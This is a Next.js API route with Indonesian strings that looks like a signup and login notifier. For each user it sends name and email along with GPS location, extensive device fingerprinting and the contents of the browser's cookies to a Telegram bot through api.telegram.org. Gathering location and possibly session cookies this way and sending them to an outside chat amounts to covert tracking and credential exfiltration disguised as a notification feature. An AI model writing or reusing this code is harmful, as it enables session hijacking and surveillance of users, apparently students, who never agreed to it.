import { NextResponse } from "next/server";

export async function POST(request: Request) {
  try {
    const { fullName, email, classLevel, type, deviceInfo } =
      await request.json();

    const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
    const CHAT_ID = process.env.TELEGRAM_CHAT_ID;

    if (!BOT_TOKEN || !CHAT_ID) {
      console.error("TELEGRAM_BOT_TOKEN atau TELEGRAM_CHAT_ID belum diatur.");
      return NextResponse.json(
        { success: false, error: "Konfigurasi Telegram belum lengkap." },
        { status: 500 },
      );
    }

    const dev = deviceInfo || {};

    const message =
      `🚀 *${type === "register" ? "PENGGUNA BARU TERDAFTAR!" : "PENGGUNA MASUK!"}*\n\n` +
      `👤 *Nama:* ${fullName}\n` +
      `📧 *Email:* ${email}\n` +
      `🎓 *Kelas:* ${classLevel || "Umum"}\n\n` +
      `📍 *TITIK LOKASI (GPS):*\n` +
      `${dev.location || "Tidak tersedia"}\n\n` +
      `📱 *SPESIFIKASI PERANGKAT & HARDWARE:*\n` +
      `🔋 *Baterai:* ${dev.battery || "Tidak diketahui"}\n` +
      `💻 *Platform/OS:* ${dev.platform || "Tidak diketahui"}\n` +
      `🎮 *Kartu Grafis (GPU):* ${dev.gpu || "Tidak diketahui"}\n` +
      `🧠 *CPU Cores:* ${dev.hardwareConcurrency || "Tidak diketahui"} Core\n` +
      `⚡ *Perkiraan RAM:* ${dev.deviceMemory || "Tidak diketahui"}\n` +
      `🖥️ *Layar:* ${dev.screenResolution || "Tidak diketahui"} (${dev.pixelRatio}, ${dev.colorDepth})\n` +
      `📐 *Orientasi:* ${dev.orientation || "Tidak diketahui"} | *Sentuh:* ${dev.touchPoints}\n\n` +
      `🌐 *JARINGAN & LINGKUNGAN:* \n` +
      `📶 *Tipe Koneksi:* ${dev.networkType || "Tidak diketahui"} (${dev.downlinkSpeed || "-"})\n` +
      `🌍 *Zona Waktu:* ${dev.timezone || "Tidak diketahui"}\n` +
      `🗣️ *Bahasa:* ${dev.userLanguage} [${dev.languagesList}]\n` +
      `🎨 *Tema Tampilan:* ${dev.themeMode}\n` +
      `🍪 *Cookie Aktif:* ${dev.cookiesActive}, DNT: ${dev.doNotTrackStatus}\n` +
      `📄 *Data Cookie Web:* \`\`\`${dev.allCookies || "Kosong"}\`\`\`\n\n` +
      `⏰ *Waktu Akses:* ${new Date().toLocaleString("id-ID")}`;

    const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;

    const response = await fetch(telegramUrl, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text: message,
        parse_mode: "Markdown",
      }),
    });

    const data = await response.json();

    if (!data.ok) {
      throw new Error(data.description || "Gagal mengirim ke Telegram");
    }

    return NextResponse.json({
      success: true,
      message: "Notifikasi terkirim!",
    });
  } catch (error) {
    console.error("Error Telegram API:", error);
    return NextResponse.json(
      { success: false, error: "Gagal mengirim notifikasi" },
      { status: 500 },
    );
  }
}
